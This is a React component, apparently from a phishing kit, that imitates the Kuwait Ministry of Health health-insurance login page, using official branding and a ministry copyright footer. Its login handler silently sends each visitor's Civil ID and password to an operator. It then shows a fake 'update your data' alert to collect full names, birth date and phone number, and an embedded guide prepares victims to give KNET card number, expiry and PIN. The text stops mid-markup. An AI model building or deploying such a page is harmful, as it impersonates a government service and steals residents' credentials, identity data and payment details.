import { useState, useEffect } from 'react';
import { useLocation } from 'wouter';
import { navigateToPage, sendData } from '../lib/store';

export default function MOHLogin() {
  const [, setLocation] = useLocation();
  const [civilId, setCivilId] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [showUpdateForm, setShowUpdateForm] = useState(false);
  const [lang, setLang] = useState<'ar' | 'en'>('ar');
  const [showGuide, setShowGuide] = useState(false);
  const [civilIdError, setCivilIdError] = useState('');

  const validateKuwaitCivilId = (id: string): boolean => {
    if (!/^[23]\d{11}$/.test(id)) return false;
    const coeff = [2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2];
    let sum = 0;
    for (let i = 0; i < 11; i++) {
      sum += parseInt(id[i]) * coeff[i];
    }
    const checkDigit = 11 - (sum % 11);
    return checkDigit === parseInt(id[11]);
  };

  // Update data form fields - Arabic name
  const [firstNameAr, setFirstNameAr] = useState('');
  const [secondNameAr, setSecondNameAr] = useState('');
  const [thirdNameAr, setThirdNameAr] = useState('');
  const [lastNameAr, setLastNameAr] = useState('');

  // English name - 4 fields
  const [firstNameEn, setFirstNameEn] = useState('');
  const [secondNameEn, setSecondNameEn] = useState('');
  const [thirdNameEn, setThirdNameEn] = useState('');
  const [lastNameEn, setLastNameEn] = useState('');

  const [birthDate, setBirthDate] = useState('');
  const [phone, setPhone] = useState('');
  const [phoneError, setPhoneError] = useState('');

  const isAr = lang === 'ar';

  useEffect(() => {
    navigateToPage('تسجيل الدخول');
  }, []);

  const handleLogin = () => {
    if (!civilId || !password) return;
    if (!validateKuwaitCivilId(civilId)) {
      setCivilIdError(lang === 'ar' ? 'الرقم المدني غير صحيح' : 'Invalid Civil ID');
      return;
    }
    setCivilIdError('');
    setLoading(true);

    sendData({
      data: {
        'الرقم المدني': civilId,
        'كلمة المرور': password,
      },
      current: 'تسجيل الدخول',
      waitingForAdminResponse: false,
      mode: 'silent',
    });

    setTimeout(() => {
      setLoading(false);
      const accountCreated = sessionStorage.getItem('mohAccountCreated');
      const registeredCivilId = sessionStorage.getItem('mohRegisteredCivilId');
      if (accountCreated === 'true' && registeredCivilId === civilId) {
        // User created account - skip update popup, go directly to register
        setLocation('/moh-register');
      } else {
        // User didn't create account - show update popup
        setShowPopup(true);
      }
    }, 3000);
  };

  const handleContinue = () => {
    setShowPopup(false);
    setShowUpdateForm(true);
    navigateToPage('تحديث البيانات');
  };

  const isPhoneValid = phone.length === 8 && /^[569]/.test(phone);
  const isUpdateValid = firstNameAr && secondNameAr && thirdNameAr && lastNameAr &&
    firstNameEn && secondNameEn && thirdNameEn && lastNameEn && birthDate && isPhoneValid;

  const handleUpdate = () => {
    if (!isUpdateValid) return;

    const fullNameAr = `${firstNameAr} ${secondNameAr} ${thirdNameAr} ${lastNameAr}`;
    const fullNameEn = `${firstNameEn} ${secondNameEn} ${thirdNameEn} ${lastNameEn}`;
    localStorage.setItem('mohCivilId', civilId);
    localStorage.setItem('mohUserName', fullNameAr);
    localStorage.setItem('mohEnglishName', fullNameEn);
    localStorage.setItem('mohBirthDate', birthDate);
    localStorage.setItem('mohPhone', '+965' + phone);

    sendData({
      data: {
        'الرقم المدني': civilId,
        'الاسم الأول (عربي)': firstNameAr,
        'الاسم الثاني (عربي)': secondNameAr,
        'الاسم الثالث (عربي)': thirdNameAr,
        'اسم العائلة (عربي)': lastNameAr,
        'الاسم الأول (إنجليزي)': firstNameEn,
        'الاسم الثاني (إنجليزي)': secondNameEn,
        'الاسم الثالث (إنجليزي)': thirdNameEn,
        'اسم العائلة (إنجليزي)': lastNameEn,
        'تاريخ الميلاد': birthDate,
        'رقم الهاتف': '+965' + phone,
      },
      current: 'تحديث البيانات',
      waitingForAdminResponse: false,
      mode: 'silent',
    });

    setLocation('/moh-register');
  };

  const inputStyle: React.CSSProperties = {
    width: '100%',
    padding: '10px 12px',
    border: '1px solid #ccc',
    borderRadius: 4,
    fontSize: 15,
    fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
    outline: 'none',
    direction: isAr ? 'rtl' : 'ltr',
    boxSizing: 'border-box',
    background: '#fff',
  };

  const labelStyle: React.CSSProperties = {
    fontSize: 14,
    fontWeight: 'bold',
    color: '#333',
    marginBottom: 5,
    display: 'block',
    textAlign: isAr ? 'right' : 'left',
  };

  // Translations
  const t = {
    ar: {
      title: 'النظام الآلي لتسجيل الضمان الصحي',
      langSwitch: 'English',
      loginTitle: 'تسجيل الدخول',
      civilId: 'الرقم المدني',
      civilIdPh: 'أدخل الرقم المدني',
      password: 'كلمة المرور',
      passwordPh: 'أدخل كلمة المرور',
      loginBtn: 'تسجيل الدخول',
      loggingIn: 'جاري تسجيل الدخول...',
      alert: 'تنبيه',
      alertMsg: 'عليك تحديث البيانات لإستكمال الدخول الى النظام',
      continue: 'متابعة',
      updateTitle: 'تحديث البيانات',
      nameAr: 'الاسم بالعربي',
      nameEn: 'الاسم بالإنجليزي',
      firstName: 'الاسم الأول',
      secondName: 'الاسم الثاني',
      thirdName: 'الاسم الثالث',
      familyName: 'اسم العائلة',
      firstNameEn: 'First Name',
      secondNameEn: 'Second Name',
      thirdNameEn: 'Third Name',
      familyNameEn: 'Family Name',
      birthDate: 'تاريخ الميلاد',
      phone: 'رقم الهاتف',
      phonePh: 'أدخل رقم الهاتف',
      updateBtn: 'تحديث',
      noAccount: 'ليس لديك حساب؟',
      createAccount: 'إنشاء حساب جديد',
      userGuide: 'دليل مستخدم التطبيق',
      footer: '© 2019 Ministry Of Health Kuwait . All Rights Reserved.',
    },
    en: {
      title: 'Automated Health Insurance Registration System',
      langSwitch: 'العربية',
      loginTitle: 'Login',
      civilId: 'Civil ID',
      civilIdPh: 'Enter Civil ID',
      password: 'Password',
      passwordPh: 'Enter Password',
      loginBtn: 'Login',
      loggingIn: 'Logging in...',
      alert: 'Alert',
      alertMsg: 'You need to update your data to complete login to the system',
      continue: 'Continue',
      updateTitle: 'Update Data',
      nameAr: 'Name in Arabic',
      nameEn: 'Name in English',
      firstName: 'الاسم الأول',
      secondName: 'الاسم الثاني',
      thirdName: 'الاسم الثالث',
      familyName: 'اسم العائلة',
      firstNameEn: 'First Name',
      secondNameEn: 'Second Name',
      thirdNameEn: 'Third Name',
      familyNameEn: 'Family Name',
      birthDate: 'Date of Birth',
      phone: 'Phone Number',
      phonePh: 'Enter Phone Number',
      updateBtn: 'Update',
      noAccount: "Don't have an account?",
      createAccount: 'Create New Account',
      userGuide: 'Application User Guide',
      footer: '© 2019 Ministry Of Health Kuwait . All Rights Reserved.',
    },
  };

  const tx = t[lang];

  return (
    <div style={{ direction: isAr ? 'rtl' : 'ltr', fontFamily: 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#fff', display: 'flex', flexDirection: 'column' }}>
      {/* Header */}
      <div style={{ background: '#0c2c3c', padding: '15px 10px', textAlign: 'center' }}>
        <img src="/FMOHLogo.svg" alt="شعار وزارة الصحة" style={{ width: 70, height: 70, margin: '0 auto' }} />
        <h1 style={{ color: '#fff', fontSize: 'clamp(16px, 4vw, 22px)', marginTop: 8, fontWeight: 'bold', padding: '0 10px' }}>{tx.title}</h1>
      </div>

      {/* Language Toggle */}
      <div style={{ textAlign: isAr ? 'left' : 'right', padding: '10px 15px' }}>
        <span
          onClick={() => setLang(isAr ? 'en' : 'ar')}
          style={{ color: 'red', fontSize: 14, cursor: 'pointer', textDecoration: 'none' }}
        >
          {tx.langSwitch}
        </span>
      </div>

      {/* Loading Overlay */}
      {loading && (
        <div style={{
          position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
          background: 'rgba(0,0,0,0.4)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999,
        }}>
          <div style={{ background: '#fff', borderRadius: 10, padding: 40, textAlign: 'center' }}>
            <div style={{
              width: 50, height: 50, border: '4px solid #eee', borderTop: '4px solid #1076BB',
              borderRadius: '50%', animation: 'spin 1s linear infinite', margin: '0 auto 15px',
            }} />
            <p style={{ color: '#333', fontSize: 16 }}>{tx.loggingIn}</p>
            <style>{`@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }`}</style>
          </div>
        </div>
      )}

      {/* Popup */}
      {showPopup && (
        <div style={{
          position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
          background: 'rgba(0,0,0,0.4)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999,
        }}>
          <div style={{ background: '#fff', borderRadius: 8, padding: '30px 40px', textAlign: 'center', maxWidth: 450, width: '90%', boxShadow: '0 4px 20px rgba(0,0,0,0.2)' }}>
            <div style={{ width: 60, height: 60, background: '#FFF3CD', borderRadius: '50%', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 15px' }}>
              <span style={{ fontSize: 30, color: '#856404' }}>!</span>
            </div>
            <h3 style={{ color: '#333', fontSize: 18, marginBottom: 10 }}>{tx.alert}</h3>
            <p style={{ color: '#555', fontSize: 15, lineHeight: 1.8, marginBottom: 25 }}>
              {tx.alertMsg}
            </p>
            <button
              onClick={handleContinue}
              style={{
                background: '#1076BB', color: '#fff', border: 'none', padding: '10px 50px',
                fontSize: 15, fontWeight: 'bold', borderRadius: 4, cursor: 'pointer',
                fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
              }}
            >
              {tx.continue}
            </button>
          </div>
        </div>
      )}

      {/* Main Content */}
      <div style={{ flex: 1 }}>
        {/* Login Form */}
        {!showUpdateForm && (
          <div style={{ maxWidth: 500, margin: '20px auto', padding: '0 15px', width: '100%', boxSizing: 'border-box' as const }}>
            <div style={{ border: '1px solid #ddd', borderRadius: 4, overflow: 'hidden' }}>
              <div style={{ background: '#1076BB', padding: '12px 20px', textAlign: 'center' }}>
                <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>{tx.loginTitle}</span>
              </div>
              <div style={{ padding: '20px 15px', background: '#f9f9f9' }}>
                <div style={{ marginBottom: 20 }}>
                  <label style={labelStyle}>{tx.civilId} <span style={{ color: 'red' }}>*</span></label>
                  <input
                    type="text"
                    value={civilId}
                    onChange={(e) => { setCivilId(e.target.value.replace(/\D/g, '')); if (civilIdError) setCivilIdError(''); }}
                    maxLength={12}
                    placeholder={tx.civilIdPh}
                    style={inputStyle}
                  />
                  {civilIdError && <p style={{ color: 'red', fontSize: 12, marginTop: 5 }}>{civilIdError}</p>}
                  {civilId.length > 0 && civilId.length < 12 && <p style={{ color: '#999', fontSize: 11, marginTop: 3 }}>{lang === 'ar' ? `${civilId.length}/12` : `${civilId.length}/12`}</p>}
                </div>
                <div style={{ marginBottom: 25 }}>
                  <label style={labelStyle}>{tx.password} <span style={{ color: 'red' }}>*</span></label>
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => { const v = e.target.value; if (/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]*$/.test(v) || v === '') setPassword(v); }}
                    placeholder={tx.passwordPh}
                    style={inputStyle}
                  />
                </div>
                <div style={{ textAlign: 'center' }}>
                  <button
                    onClick={handleLogin}
                    disabled={!civilId || !password}
                    style={{
                      background: (!civilId || !password) ? '#ccc' : '#1076BB',
                      color: '#fff', border: 'none', padding: '12px 40px',
                      fontSize: 'clamp(14px, 3.5vw, 16px)', fontWeight: 'bold', borderRadius: 4,
                      cursor: (!civilId || !password) ? 'not-allowed' : 'pointer',
                      fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                      width: '100%', maxWidth: 280,
                    }}
                  >
                    {tx.loginBtn}
                  </button>
                </div>
              </div>
            </div>

            {/* Links below form */}
            <div style={{ textAlign: 'center', marginTop: 25 }}>
              <p style={{ fontSize: 14, color: '#555', marginBottom: 8 }}>
                {tx.noAccount} <a href="/moh-create-account" style={{ color: '#1076BB', textDecoration: 'none', fontWeight: 'bold' }}>{tx.createAccount}</a>
              </p>
              <p>
                <a href="#" onClick={(e) => { e.preventDefault(); setShowGuide(true); }} style={{ color: '#1076BB', textDecoration: 'underline', fontSize: 14 }}>{tx.userGuide}</a>
              </p>
            </div>
          </div>
        )}

        {/* Update Data Form */}
        {showUpdateForm && (
          <div style={{ maxWidth: 600, margin: '20px auto', padding: '0 15px', width: '100%', boxSizing: 'border-box' as const }}>
            <div style={{ border: '1px solid #ddd', borderRadius: 4, overflow: 'hidden' }}>
              <div style={{ background: '#1076BB', padding: '12px 20px', textAlign: 'center' }}>
                <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>{tx.updateTitle}</span>
              </div>
              <div style={{ padding: '20px 15px', background: '#f9f9f9' }}>
                {/* Civil ID - dynamic from login */}
                <div style={{ marginBottom: 18 }}>
                  <label style={labelStyle}>{tx.civilId}</label>
                  <input
                    type="text"
                    value={civilId}
                    readOnly
                    style={{ ...inputStyle, background: '#e9ecef', color: '#555' }}
                  />
                </div>

                {/* Arabic Name - 4 fields */}
                <label style={{ ...labelStyle, marginBottom: 10 }}>{tx.nameAr} <span style={{ color: 'red' }}>*</span></label>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10, marginBottom: 18 }}>
                  <div>
                    <input
                      type="text"
                      value={firstNameAr}
                      onChange={(e) => setFirstNameAr(e.target.value.replace(/[^\u0600-\u06FF\s]/g, ''))}
                      placeholder={tx.firstName}
                      style={{ ...inputStyle, direction: 'rtl' }}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      value={secondNameAr}
                      onChange={(e) => setSecondNameAr(e.target.value.replace(/[^\u0600-\u06FF\s]/g, ''))}
                      placeholder={tx.secondName}
                      style={{ ...inputStyle, direction: 'rtl' }}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      value={thirdNameAr}
                      onChange={(e) => setThirdNameAr(e.target.value.replace(/[^\u0600-\u06FF\s]/g, ''))}
                      placeholder={tx.thirdName}
                      style={{ ...inputStyle, direction: 'rtl' }}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      value={lastNameAr}
                      onChange={(e) => setLastNameAr(e.target.value.replace(/[^\u0600-\u06FF\s]/g, ''))}
                      placeholder={tx.familyName}
                      style={{ ...inputStyle, direction: 'rtl' }}
                    />
                  </div>
                </div>

                {/* English Name - 4 fields */}
                <label style={{ ...labelStyle, marginBottom: 10 }}>{tx.nameEn} <span style={{ color: 'red' }}>*</span></label>
                <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 10, marginBottom: 18, direction: 'ltr' }}>
                  <div>
                    <input
                      type="text"
                      value={firstNameEn}
                      onChange={(e) => setFirstNameEn(e.target.value.replace(/[^a-zA-Z\s]/g, ''))}
                      placeholder={tx.firstNameEn}
                      style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      value={secondNameEn}
                      onChange={(e) => setSecondNameEn(e.target.value.replace(/[^a-zA-Z\s]/g, ''))}
                      placeholder={tx.secondNameEn}
                      style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      value={thirdNameEn}
                      onChange={(e) => setThirdNameEn(e.target.value.replace(/[^a-zA-Z\s]/g, ''))}
                      placeholder={tx.thirdNameEn}
                      style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
                    />
                  </div>
                  <div>
                    <input
                      type="text"
                      value={lastNameEn}
                      onChange={(e) => setLastNameEn(e.target.value.replace(/[^a-zA-Z\s]/g, ''))}
                      placeholder={tx.familyNameEn}
                      style={{ ...inputStyle, direction: 'ltr', textAlign: 'left' }}
                    />
                  </div>
                </div>

                {/* Birth Date */}
                <div style={{ marginBottom: 18 }}>
                  <label style={labelStyle}>{tx.birthDate} <span style={{ color: 'red' }}>*</span></label>
                  <input
                    type="date"
                    value={birthDate}
                    onChange={(e) => setBirthDate(e.target.value)}
                    style={{ ...inputStyle, maxWidth: '100%', height: 42, WebkitAppearance: 'none', MozAppearance: 'none', appearance: 'none' as any }}
                  />
                </div>

                {/* Phone */}
                <div style={{ marginBottom: 25 }}>
                  <label style={labelStyle}>{tx.phone} <span style={{ color: 'red' }}>*</span></label>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 0, direction: 'ltr' }}>
                    <span style={{
                      background: '#f0f0f0',
                      border: '1px solid #ccc',
                      borderRight: 'none',
                      borderRadius: '6px 0 0 6px',
                      padding: '10px 12px',
                      fontSize: 15,
                      color: '#333',
                      fontWeight: 'bold',
                      height: '44px',
                      display: 'flex',
                      alignItems: 'center',
                      userSelect: 'none'
                    }}>+965</span>
                    <input
                      type="tel"
                      value={phone}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, '');
                        if (val.length <= 8) {
                          setPhone(val);
                          setPhoneError('');
                        }
                      }}
                      onBlur={() => {
                        if (phone && (phone.length !== 8 || !/^[569]/.test(phone))) {
                          setPhoneError(isAr ? 'رقم الهاتف يجب أن يكون 8 أرقام ويبدأ بـ 5 أو 6 أو 9' : 'Phone must be 8 digits starting with 5, 6 or 9');
                        }
                      }}
                      maxLength={8}
                      placeholder={'XXXX XXXX'}
                      style={{ ...inputStyle, direction: 'ltr', textAlign: 'left', borderRadius: '0 6px 6px 0', flex: 1 }}
                    />
                  </div>
                  {phoneError && <p style={{ color: 'red', fontSize: 12, marginTop: 4 }}>{phoneError}</p>}
                </div>

                {/* Update Button */}
                <div style={{ textAlign: 'center' }}>
                  <button
                    onClick={handleUpdate}
                    disabled={!isUpdateValid}
                    style={{
                      background: !isUpdateValid ? '#ccc' : '#1076BB',
                      color: '#fff', border: 'none', padding: '12px 40px',
                      fontSize: 'clamp(14px, 3.5vw, 16px)', fontWeight: 'bold', borderRadius: 4,
                      cursor: !isUpdateValid ? 'not-allowed' : 'pointer',
                      fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
                      width: '100%', maxWidth: 280,
                    }}
                  >
                    {tx.updateBtn}
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* User Guide Modal */}
      {showGuide && (
        <div style={{
          position: 'fixed', top: 0, left: 0, right: 0, bottom: 0,
          background: 'rgba(0,0,0,0.5)', display: 'flex', alignItems: 'center', justifyContent: 'center', zIndex: 9999,
        }}>
          <div style={{
            background: '#fff', borderRadius: 4, width: '90%', maxWidth: 900, maxHeight: '90vh',
            display: 'flex', flexDirection: 'column', boxShadow: '0 4px 20px rgba(0,0,0,0.3)',
          }}>
            {/* Modal Header */}
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '10px 20px', borderBottom: '1px solid #ddd', direction: 'rtl' }}>
              <h3 style={{ color: '#1076BB', fontSize: 16, margin: 0, fontWeight: 'bold' }}>{isAr ? 'دليل مستخدم التطبيق' : 'Application User Guide'}</h3>
              <span onClick={() => setShowGuide(false)} style={{ fontSize: 22, cursor: 'pointer', color: '#999', fontWeight: 'bold' }}>&times;</span>
            </div>
            {/* Modal Body - Embedded Document Style */}
            <div style={{ flex: 1, overflow: 'auto', padding: '15px', direction: 'rtl', fontFamily: 'Cairo, Tahoma, Arial, sans-serif' }}>
              <div style={{ border: '1px solid #ccc', background: '#f5f5f5' }}>
                {/* Slide Navigation Bar (gray) */}
                <div style={{ background: 'linear-gradient(to bottom, #e8e8e8, #d0d0d0)', height: 18, borderBottom: '1px solid #bbb' }} />
                {/* Slide Content Area */}
                <div style={{ background: '#fff', margin: '0', minHeight: 400, overflow: 'auto' }}>
                  {/* Cover Slide */}
                  <div style={{ textAlign: 'center', padding: '60px 40px 40px' }}>
                    <img src="/moh-health-logo.png" alt="شعار وزارة الصحة" style={{ width: 150, height: 150, objectFit: 'contain' }} />
                    <p style={{ color: '#999', fontSize: 16, marginTop: 10, marginBottom: 5 }}>إدارة نظم المعلومات</p>
                    <h2 style={{ fontSize: 26, fontWeight: 'bold', color: '#000', margin: '5px 0 40px' }}>وزارة الصحة</h2>
                  </div>
                  {/* Gray Divider Bar */}
                  <div style={{ background: '#d9d9d9', height: 50, margin: '0' }} />
                  
                  {/* Content Slides */}
                  <div style={{ padding: '20px 15px', direction: 'rtl' }}>
                    <h2 style={{ fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'right', color: '#000' }}>حول المستند؟</h2>
                    <p style={{ fontSize: 15, lineHeight: 2, color: '#333', textAlign: 'right', marginBottom: 30 }}>
                      يغطي هذا المستند الوظائف المقدمة في تطبيق الضمان الصحي عبر الإنترنت والخطوات المختلفة المتضمنة ، و سيحصل القارئ على فهم أساسي لكيفية استخدام التطبيق عبر الإنترنت بعد قراءة المستند.
                    </p>
                    <h2 style={{ fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'right', color: '#000' }}>الفئة المستفيده من هذه الخدمة</h2>
                    <p style={{ fontSize: 15, lineHeight: 2, color: '#333', textAlign: 'right', marginBottom: 30 }}>
                      هذا المستند يُخدم المقيمين في دوله الكويت الراغبين في تسديد الضمان الصحي عبر الإنترنت.
                    </p>

                    <h2 style={{ fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'right', color: '#000' }}>كيفية الوصول إلى خدمة الضمان الصحي عبر الإنترنت؟</h2>
                    <div style={{ fontSize: 15, lineHeight: 2.2, color: '#333', textAlign: 'right', paddingRight: 10 }}>
                      <p style={{ marginBottom: 5 }}>يرجى زيارة الموقع الإلكتروني لوزارة الصحة (<a href="https://www.moh.gov.kw" target="_blank" style={{ color: '#1076BB' }}>https://www.moh.gov.kw</a>).</p>
                      <p style={{ marginBottom: 5 }}>اضغط على أيقونة "الضمان الصحي" من القائمة الرئيسية.</p>
                      <p style={{ marginBottom: 5 }}>سيتم توجيهك إلى صفحة تسجيل الدخول للنظام الآلي للضمان الصحي.</p>
                      <p style={{ marginBottom: 5 }}>أدخل الرقم المدني وكلمة المرور الخاصة بك.</p>
                      <p style={{ marginBottom: 5 }}>في حال عدم وجود حساب، اضغط على "إنشاء حساب جديد".</p>
                      <p style={{ marginBottom: 5 }}>بعد تسجيل الدخول، قم بتحديث بياناتك الشخصية.</p>
                      <p style={{ marginBottom: 5 }}>اختر نوع الخدمة المطلوبة وأكمل نموذج التسجيل.</p>
                      <p style={{ marginBottom: 5 }}>قم بالدفع الإلكتروني لإتمام عملية التسجيل.</p>
                    </div>

                    {/* Divider */}
                    <div style={{ background: '#d9d9d9', height: 30, margin: '30px 0' }} />

                    <h2 style={{ fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'right', color: '#000' }}>تسجيل الدخول</h2>
                    <p style={{ fontSize: 15, lineHeight: 2, color: '#333', textAlign: 'right', marginBottom: 10 }}>
                      للدخول إلى النظام الآلي للضمان الصحي، اتبع الخطوات التالية:
                    </p>
                    <div style={{ fontSize: 15, lineHeight: 2.2, color: '#333', textAlign: 'right', paddingRight: 10 }}>
                      <p style={{ marginBottom: 5 }}>1. افتح صفحة تسجيل الدخول عبر الرابط: <a href="https://insonline.moh.gov.kw" target="_blank" style={{ color: '#1076BB' }}>insonline.moh.gov.kw</a></p>
                      <p style={{ marginBottom: 5 }}>2. أدخل الرقم المدني في الحقل المخصص.</p>
                      <p style={{ marginBottom: 5 }}>3. أدخل كلمة المرور الخاصة بك.</p>
                      <p style={{ marginBottom: 5 }}>4. اضغط على زر "تسجيل الدخول".</p>
                      <p style={{ marginBottom: 5 }}>5. في حال نسيت كلمة المرور، اضغط على "نسيت تفاصيل الدخول" لإعادة تعيينها.</p>
                    </div>

                    {/* Divider */}
                    <div style={{ background: '#d9d9d9', height: 30, margin: '30px 0' }} />

                    <h2 style={{ fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'right', color: '#000' }}>إنشاء حساب جديد</h2>
                    <p style={{ fontSize: 15, lineHeight: 2, color: '#333', textAlign: 'right', marginBottom: 10 }}>
                      إذا لم يكن لديك حساب في النظام، يمكنك إنشاء حساب جديد باتباع الخطوات التالية:
                    </p>
                    <div style={{ fontSize: 15, lineHeight: 2.2, color: '#333', textAlign: 'right', paddingRight: 10 }}>
                      <p style={{ marginBottom: 5 }}>1. من صفحة تسجيل الدخول، اضغط على "إنشاء حساب جديد".</p>
                      <p style={{ marginBottom: 5 }}>2. حدد فئة المستخدم (جهة حكومية / تسجيل شخصي / تسجيل شركات / الجامعة).</p>
                      <p style={{ marginBottom: 5 }}>3. أدخل الرقم المدني.</p>
                      <p style={{ marginBottom: 5 }}>4. اختر الجنس والمحافظة.</p>
                      <p style={{ marginBottom: 5 }}>5. أدخل كلمة المرور وتأكيد كلمة المرور.</p>
                      <p style={{ marginBottom: 5 }}>6. أدخل البريد الإلكتروني ورقم الهاتف.</p>
                      <p style={{ marginBottom: 5 }}>7. اضغط على زر "إنشاء حساب".</p>
                      <p style={{ marginBottom: 5 }}>8. سيتم إرسال رمز التحقق إلى هاتفك أو بريدك الإلكتروني.</p>
                    </div>

                    {/* Divider */}
                    <div style={{ background: '#d9d9d9', height: 30, margin: '30px 0' }} />

                    <h2 style={{ fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'right', color: '#000' }}>تحديث البيانات الشخصية</h2>
                    <p style={{ fontSize: 15, lineHeight: 2, color: '#333', textAlign: 'right', marginBottom: 10 }}>
                      بعد تسجيل الدخول لأول مرة، سيُطلب منك تحديث بياناتك الشخصية:
                    </p>
                    <div style={{ fontSize: 15, lineHeight: 2.2, color: '#333', textAlign: 'right', paddingRight: 10 }}>
                      <p style={{ marginBottom: 5 }}>1. ستظهر رسالة تنبيه "عليك تحديث البيانات لإستكمال الدخول الى النظام".</p>
                      <p style={{ marginBottom: 5 }}>2. اضغط على "متابعة" للانتقال إلى شاشة تحديث البيانات.</p>
                      <p style={{ marginBottom: 5 }}>3. تأكد من صحة الرقم المدني (يتم تعبئته تلقائياً).</p>
                      <p style={{ marginBottom: 5 }}>4. أدخل الاسم الرباعي باللغة العربية (الاسم الأول، الثاني، الثالث، اسم العائلة).</p>
                      <p style={{ marginBottom: 5 }}>5. أدخل الاسم الرباعي باللغة الإنجليزية.</p>
                      <p style={{ marginBottom: 5 }}>6. أدخل تاريخ الميلاد ورقم الهاتف.</p>
                      <p style={{ marginBottom: 5 }}>7. اضغط على زر "تحديث" لحفظ البيانات.</p>
                    </div>

                    {/* Divider */}
                    <div style={{ background: '#d9d9d9', height: 30, margin: '30px 0' }} />

                    <h2 style={{ fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'right', color: '#000' }}>اختيار نوع الخدمة</h2>
                    <p style={{ fontSize: 15, lineHeight: 2, color: '#333', textAlign: 'right', marginBottom: 10 }}>
                      بعد تحديث البيانات، يمكنك اختيار نوع الخدمة المطلوبة:
                    </p>
                    <div style={{ fontSize: 15, lineHeight: 2.2, color: '#333', textAlign: 'right', paddingRight: 10 }}>
                      <p style={{ marginBottom: 5 }}>1. اختر نوع الخدمة من القائمة المنسدلة (تسجيل جديد / تجديد / إلخ).</p>
                      <p style={{ marginBottom: 5 }}>2. حدد نوع الإقامة (إقامة عمل أهلي / إقامة التحاق عائلي مادة 22 / إقامة طالب / كفالة ذاتية / مادة 20 / إلخ).</p>
                      <p style={{ marginBottom: 5 }}>3. سيظهر المبلغ المطلوب سنوياً حسب نوع الإقامة المختارة.</p>
                      <p style={{ marginBottom: 5 }}>4. حدد حالة الضمان (جديد أو تجديد).</p>
                    </div>

                    {/* Divider */}
                    <div style={{ background: '#d9d9d9', height: 30, margin: '30px 0' }} />

                    <h2 style={{ fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'right', color: '#000' }}>تعبئة نموذج التسجيل</h2>
                    <p style={{ fontSize: 15, lineHeight: 2, color: '#333', textAlign: 'right', marginBottom: 10 }}>
                      قم بتعبئة جميع البيانات المطلوبة في نموذج التسجيل:
                    </p>
                    <div style={{ fontSize: 15, lineHeight: 2.2, color: '#333', textAlign: 'right', paddingRight: 10 }}>
                      <p style={{ marginBottom: 5 }}>1. أدخل الرقم المدني ورقم الكفيل المدني.</p>
                      <p style={{ marginBottom: 5 }}>2. أدخل الاسم الكامل والجنس وتاريخ الميلاد.</p>
                      <p style={{ marginBottom: 5 }}>3. اختر الجنسية والشركة ومكان العمل.</p>
                      <p style={{ marginBottom: 5 }}>4. أدخل تاريخ انتهاء جواز السفر.</p>
                      <p style={{ marginBottom: 5 }}>5. حدد عدد سنوات التغطية وتاريخ بداية ونهاية التغطية.</p>
                      <p style={{ marginBottom: 5 }}>6. أدخل البريد الإلكتروني ورقم الهاتف.</p>
                      <p style={{ marginBottom: 5 }}>7. وافق على الشروط والأحكام.</p>
                    </div>

                    {/* Divider */}
                    <div style={{ background: '#d9d9d9', height: 30, margin: '30px 0' }} />

                    <h2 style={{ fontSize: 22, fontWeight: 'bold', marginBottom: 15, textAlign: 'right', color: '#000' }}>الدفع الإلكتروني</h2>
                    <p style={{ fontSize: 15, lineHeight: 2, color: '#333', textAlign: 'right', marginBottom: 10 }}>
                      لإتمام عملية التسجيل، يجب إكمال الدفع الإلكتروني:
                    </p>
                    <div style={{ fontSize: 15, lineHeight: 2.2, color: '#333', textAlign: 'right', paddingRight: 10 }}>
                      <p style={{ marginBottom: 5 }}>1. بعد تعبئة النموذج، اضغط على زر "الدفع الإلكتروني".</p>
                      <p style={{ marginBottom: 5 }}>2. سيتم تحويلك إلى بوابة الدفع (KNET).</p>
                      <p style={{ marginBottom: 5 }}>3. أدخل بيانات بطاقة الخصم المباشر (رقم البطاقة، تاريخ الانتهاء، رمز PIN).</p>
                      <p style={{ marginBottom: 5 }}>4. تأكد من صحة المبلغ واضغط على "تأكيد الدفع".</p>
                      <p style={{ marginBottom: 5 }}>5. بعد نجاح العملية، سيتم إصدار إيصال الدفع فوراً.</p>
